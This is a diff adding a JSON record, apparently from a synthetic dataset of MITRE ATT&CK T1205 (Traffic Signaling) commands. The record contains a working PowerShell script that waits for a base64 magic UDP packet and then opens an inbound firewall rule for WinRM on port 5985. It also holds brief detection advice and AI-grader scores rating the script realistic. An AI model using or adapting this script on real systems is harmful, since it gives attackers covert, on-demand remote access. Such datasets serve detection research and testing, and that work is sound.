@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $port=49152; $udp=New-Object System.Net.Sockets.UdpClient($port); $ep=New-Object System.Net.IPEndPoint([IPAddress]::Any,0); $data=$udp.Receive([ref]$ep); $udp.Close(); $msg=[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($data))); if($msg -eq 'OPEN:5985'){ New-NetFirewallRule -DisplayName 'Temp WinRM Unlock' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -Profile Any | Out-Null } }",
+  "explanation": "Implements a basic UDP magic-packet listener that decodes a base64 message 'OPEN:5985' and opens an inbound firewall rule for WinRM (5985). Detection: audit new firewall rules (Microsoft-Windows-Windows Firewall With Advanced Security logs), unexpected rules enabling WinRM, and UDP listeners on non-standard ports. Requires Administrator; if not already elevated, UAC prompt is triggered.",
+  "rationale_steps": [
+    "Receive and decode a base64 magic message as a trigger.",
+    "Create a firewall rule to enable WinRM inbound access on demand.",
+    "Provide detection guidance via firewall rule change auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-d5961ae1",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with balanced braces and quotes, valid cmdlets and type references, and should parse as written.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly implements a UDP magic-packet trigger decoded via Base64 to open a WinRM firewall rule (Traffic Signaling), but success depends on admin rights and the UAC/privilege claims are inconsistent.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:19:21.086429Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced braces, parentheses, and quotes, proper semicolon separators, and valid .NET class instantiation syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a UDP magic-packet/traffic-signaling listener (T1205) that receives a packet on a high ephemeral port, decodes a base64-encoded trigger string, and conditionally creates a firewall rule to open WinRM port 5985, which is operationally coherent and realistic for port-knocking style C2 activation.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T04:05:38.483419Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed PowerShell script block using valid .NET classes, correct variable assignments, and balanced delimiters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements a UDP listener that waits for a specific base64-encoded payload to trigger a firewall rule modification, perfectly demonstrating the Traffic Signaling technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T04:05:40.893398Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
